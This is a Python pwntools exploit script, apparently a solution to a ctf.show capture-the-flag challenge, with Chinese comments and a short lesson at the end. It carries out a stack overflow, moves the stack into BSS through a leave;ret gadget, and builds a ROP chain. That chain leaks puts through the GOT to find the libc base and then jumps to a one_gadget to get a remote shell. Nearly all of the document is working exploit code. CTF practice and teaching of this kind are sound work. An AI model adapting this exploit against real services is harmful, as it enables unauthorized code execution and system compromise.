from pwn import *

context(arch = 'amd64', os = 'linux', log_level = 'debug')

io = remote('pwn.challenge.ctf.show', 28258)
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

# poprdi = 0x400be3：pop rdi; ret gadget的地址
poprdi = 0x400be3

# poprsir15 = 0x400be1：pop rsi; pop r15; ret gadget的地址
poprsir15 = 0x400be1

# bssaddr = 0x602010：BSS段地址，用于栈迁移的目标位置
bssaddr = 0x602010

# leaveret = 0x40098c：leave; ret gadget的地址，用于栈迁移
leaveret = 0x40098c

# 构造payload，包含栈迁移和ROP链
# b'a' * 0x510：填充到返回地址位置
# p64(bssaddr - 0x8)：覆盖rbp为bssaddr - 0x8，为栈迁移做准备
# p64(poprdi) + p64(elf.got['puts']) + p64(elf.symbols['puts'])：调用puts函数泄露puts的GOT表地址
# p64(poprdi) + p64(0)：设置第一个参数为0
# p64(poprsir15) + p64(bssaddr) + p64(0) + p64(elf.symbols['read'])：调用read函数读取shellcode到bssaddr
# p64(leaveret)：执行leave; ret，完成栈迁移
payload = b'a' * 0x510 + p64(bssaddr - 0x8)
payload += p64(poprdi) + p64(elf.got['puts']) + p64(elf.symbols['puts'])
payload += p64(poprdi) + p64(0)
payload += p64(poprsir15) + p64(bssaddr) + p64(0) + p64(elf.symbols['read'])
payload += p64(leaveret)
payload = payload.ljust(0x1000, b'a')

# 等待提示信息，发送payload长度
io.recvuntil("How much do you want to send this time?\n")
io.sendline(str(0x1000))

# 发送payload
io.send(payload)

# 接收返回信息，解析puts的地址
io.recvuntil("See you next time!\n")
puts_addr = u64(io.recv(6).ljust(8, b'\x00'))
print(hex(puts_addr))

# 计算libc基址和one_gadget地址
libcbase = puts_addr - libc.symbols['puts']
shell = p64(libcbase + 0x4f302)  # one_gadget地址

# 发送one_gadget地址
io.send(shell)
io.interactive()

"""
【知识点讲解】
1. 题目类型：stack migration - 栈迁移 + ROP + one_gadget
2. 核心原理：
   - 利用栈迁移技术将栈指针指向BSS段
   - 通过ROP链泄露libc地址
   - 使用one_gadget获取shell
3. 关键步骤：
   - 构造栈迁移payload，设置rbp为bssaddr - 0x8
   - 构造ROP链，泄露puts地址并准备读取shellcode
   - 执行leave; ret完成栈迁移
   - 计算libc基址和one_gadget地址
   - 发送one_gadget地址获取shell
4. 执行流程：
   - 栈迁移 -> 泄露libc地址 -> 计算one_gadget地址 -> 执行one_gadget获取shell
5. 技术要点：
   - 栈迁移技术（leave; ret）
   - ROP链构造
   - one_gadget的使用
   - libc地址泄露
"""
